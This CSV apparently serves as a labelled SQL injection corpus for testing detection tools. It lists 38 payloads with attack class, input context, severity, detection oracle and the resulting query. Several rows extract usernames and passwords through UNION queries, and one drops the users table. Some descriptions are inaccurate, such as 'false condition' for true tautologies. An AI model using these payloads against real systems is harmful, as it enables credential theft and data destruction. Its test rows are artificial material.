id,label,attack_class,type,payload,context,context_bucket,severity,severity_original,severity_reason,is_destructive,destructive_flags,oracle,description,example
sqli-001,attack,sqli,tautology,' OR '1'='1,Login form username input,login_form,high,high,base sqli/tautology=high,False,[],differential,Basic tautology-based SQL injection,SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''
sqli-002,attack,sqli,union,"' UNION SELECT username, password FROM users--",Search input field,search_field,high,high,base sqli/union=high,False,[],marker_reflection,Union-based SQL injection to extract data,"SELECT name, description FROM products WHERE name = '' UNION SELECT username, password FROM users--"
sqli-003,attack,sqli,blind-time,'; WAITFOR DELAY '0:0:5'--,ID parameter in URL,url_param,high,medium,base sqli/blind-time=high,False,[],timing,Blind SQL injection with time delay,SELECT * FROM orders WHERE id = ''; WAITFOR DELAY '0:0:5'--
sqli-004,attack,sqli,error-based,"' AND 1=CONVERT(int,@@version)--",User ID input,url_param,high,medium,base sqli/error-based=high,False,[],error_signature,Error-based SQL injection to reveal database version,"SELECT * FROM users WHERE id = '' AND 1=CONVERT(int,@@version)--"
sqli-005,attack,sqli,boolean-blind,' AND 1=1--,Search field,search_field,high,medium,base sqli/boolean-blind=high,False,[],differential,Boolean-based blind SQL injection,SELECT * FROM products WHERE name = '' AND 1=1--
sqli-006,attack,sqli,stacked-queries,'; DROP TABLE users--,User input in form,form_field,critical,critical,base sqli/stacked-queries=critical; destructive ['sql_write'] -> critical,True,['sql_write'],timing,Stacked queries to execute multiple statements,SELECT * FROM users WHERE username = ''; DROP TABLE users--
sqli-007,attack,sqli,tautology,' OR 1=1--,Login password field,login_form,high,high,base sqli/tautology=high,False,[],differential,Using comment to truncate query,SELECT * FROM users WHERE password = '' OR 1=1--
sqli-008,attack,sqli,tautology,0x27 OR 0x31=0x31--,URL parameter,url_param,high,medium,base sqli/tautology=high,False,[],differential,Hex encoded payload,SELECT * FROM products WHERE id = 0x27 OR 0x31=0x31--
sqli-009,attack,sqli,blind-time,'; SELECT pg_sleep(5)--,PostgreSQL ID parameter,comment_field,high,medium,base sqli/blind-time=high,False,[],timing,Using sleep for blind time-based injection,SELECT * FROM orders WHERE id = ''; SELECT pg_sleep(5)--
sqli-010,attack,sqli,error-based,"' AND 1=CONVERT(int,USER())--",User input,form_field,high,medium,base sqli/error-based=high,False,[],error_signature,Extracting database user with error-based injection,"SELECT * FROM accounts WHERE user = '' AND 1=CONVERT(int,USER())--"
sqli-011,attack,sqli,boolean-blind,"' AND SUBSTRING(@@version,1,1)='5'--",Search input,search_field,high,medium,base sqli/boolean-blind=high,False,[],differential,Blind boolean-based injection with AND condition,"SELECT * FROM products WHERE name = '' AND SUBSTRING(@@version,1,1)='5'--"
sqli-012,attack,sqli,tautology,' OR 'a'='a,Login username,login_form,high,high,base sqli/tautology=high,False,[],differential,Using OR with false condition to bypass filters,SELECT * FROM users WHERE username = '' OR 'a'='a' AND password = ''
sqli-013,attack,sqli,tautology,' OR 1=1-- -,Search field,search_field,high,high,base sqli/tautology=high,False,[],differential,Using double dash comment to truncate query,SELECT * FROM items WHERE name = '' OR 1=1-- -
sqli-014,attack,sqli,tautology,'//OR//1=1--,Login form,login_form,high,high,base sqli/tautology=high,False,[],differential,Using inline comment to bypass filters,SELECT * FROM users WHERE username = ''//OR//1=1--
sqli-015,attack,sqli,tautology,' OR CAST('a' AS INT)=CAST('a' AS INT)--,User input,form_field,high,medium,base sqli/tautology=high,False,[],differential,Using cast to bypass filters,SELECT * FROM users WHERE username = '' OR CAST('a' AS INT)=CAST('a' AS INT)--
sqli-016,attack,sqli,blind-time,' OR SLEEP(5)--,ID parameter,url_param,high,medium,base sqli/blind-time=high,False,[],timing,Using sleep in MySQL for time-based blind injection,SELECT * FROM orders WHERE id = '' OR SLEEP(5)--
sqli-017,attack,sqli,error-based,"' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",User input,form_field,high,high,base sqli/error-based=high,False,[],error_signature,Using extractvalue for error-based injection,"SELECT * FROM users WHERE id = '' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--"
sqli-018,attack,sqli,error-based,"' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",User input,form_field,high,high,base sqli/error-based=high,False,[],error_signature,Using updatexml for error-based injection,"SELECT * FROM users WHERE id = '' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--"
sqli-019,attack,sqli,blind-time,'; SELECT pg_sleep(10)--,ID parameter,url_param,high,medium,base sqli/blind-time=high,False,[],timing,Using sleep in PostgreSQL for time-based injection,SELECT * FROM orders WHERE id = ''; SELECT pg_sleep(10)--
sqli-020,attack,sqli,tautology,' OR 1=1#,Login form,login_form,high,high,base sqli/tautology=high,False,[],differential,Using OR with false condition and comment,SELECT * FROM users WHERE username = '' OR 1=1#
sqli-021,attack,sqli,blind-time,' OR SLEEP(10)--,Search input,search_field,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in MySQL,SELECT * FROM products WHERE name = '' OR SLEEP(10)--
sqli-022,attack,sqli,union,"' UNION SELECT NULL, NULL, username, password FROM users--",Search field,search_field,high,high,base sqli/union=high,False,[],marker_reflection,Using UNION SELECT with NULLs to bypass column count,"SELECT id, name, description FROM products WHERE name = '' UNION SELECT NULL, NULL, username, password FROM users--"
sqli-023,attack,sqli,tautology,' OR 1=1/*,Login username,login_form,high,high,base sqli/tautology=high,False,[],differential,Using OR with false condition and inline comment,SELECT * FROM users WHERE username = '' OR 1=1/*
sqli-024,attack,sqli,boolean-blind,' AND (SELECT COUNT(*) FROM users) > 0--,Search input,search_field,high,medium,base sqli/boolean-blind=high,False,[],differential,Using AND with subquery for blind boolean injection,SELECT * FROM products WHERE name = '' AND (SELECT COUNT(*) FROM users) > 0--
sqli-025,attack,sqli,blind-time,' OR pg_sleep(7)--,ID parameter,url_param,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in PostgreSQL,SELECT * FROM orders WHERE id = '' OR pg_sleep(7)--
sqli-026,attack,sqli,union,"' UNION SELECT database(), NULL--",Search input,search_field,high,high,base sqli/union=high,False,[],marker_reflection,Using UNION SELECT with database() function,"SELECT name, description FROM products WHERE name = '' UNION SELECT database(), NULL--"
sqli-027,attack,sqli,blind-time,'; WAITFOR DELAY '0:0:10'--,User ID input,url_param,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in SQL Server,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:10'--
sqli-028,attack,sqli,tautology,' OR CAST(1 AS INT)=1--,Login form,login_form,high,medium,base sqli/tautology=high,False,[],differential,Using OR with cast to bypass filters,SELECT * FROM users WHERE username = '' OR CAST(1 AS INT)=1--
sqli-029,attack,sqli,boolean-blind,"' OR SUBSTRING(user(),1,1)='r'--",Search input,search_field,high,medium,base sqli/boolean-blind=high,False,[],differential,Using OR with substring for blind boolean injection,"SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='r'--"
sqli-030,attack,sqli,blind-time,' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--,User input,form_field,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in Oracle,SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--
sqli-031,attack,sqli,union,"' UNION SELECT table_name, NULL FROM information_schema.tables--",Search input,search_field,high,high,base sqli/union=high,False,[],marker_reflection,Using UNION SELECT with information_schema.tables,"SELECT name, description FROM products WHERE name = '' UNION SELECT table_name, NULL FROM information_schema.tables--"
sqli-032,attack,sqli,blind-time,' OR (SELECT sleep(5))--,ID parameter,url_param,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in SQLite,SELECT * FROM orders WHERE id = '' OR (SELECT sleep(5))--
sqli-033,attack,sqli,tautology,' OR 0x61646d696e=0x61646d696e--,Login username,login_form,high,medium,base sqli/tautology=high,False,[],differential,Using OR with hex encoded string,SELECT * FROM users WHERE username = '' OR 0x61646d696e=0x61646d696e--
sqli-034,attack,sqli,blind-time,' OR SLEEP(5)#,Search input,search_field,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in MySQL with comment,SELECT * FROM products WHERE name = '' OR SLEEP(5)#
sqli-035,attack,sqli,union,"' UNION SELECT user(), NULL--",Search input,search_field,high,high,base sqli/union=high,False,[],marker_reflection,Using UNION SELECT with user() function,"SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--"
sqli-036,attack,sqli,blind-time,' OR pg_sleep(3)--,ID parameter,url_param,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in PostgreSQL with comment,SELECT * FROM orders WHERE id = '' OR pg_sleep(3)--
sqli-037,attack,sqli,blind-time,'; WAITFOR DELAY '0:0:3'--,User ID input,url_param,high,medium,base sqli/blind-time=high,False,[],timing,Using OR with sleep for time delay in SQL Server with comment,SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:3'--
sqli-038,attack,sqli,boolean-blind,"' OR SUBSTRING(@@version,1,1)='5'--",Search input,search_field,high,medium,base sqli/boolean-blind=high,False,[],differential,Using OR with substring for blind boolean injection with comment,"SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='5'--"
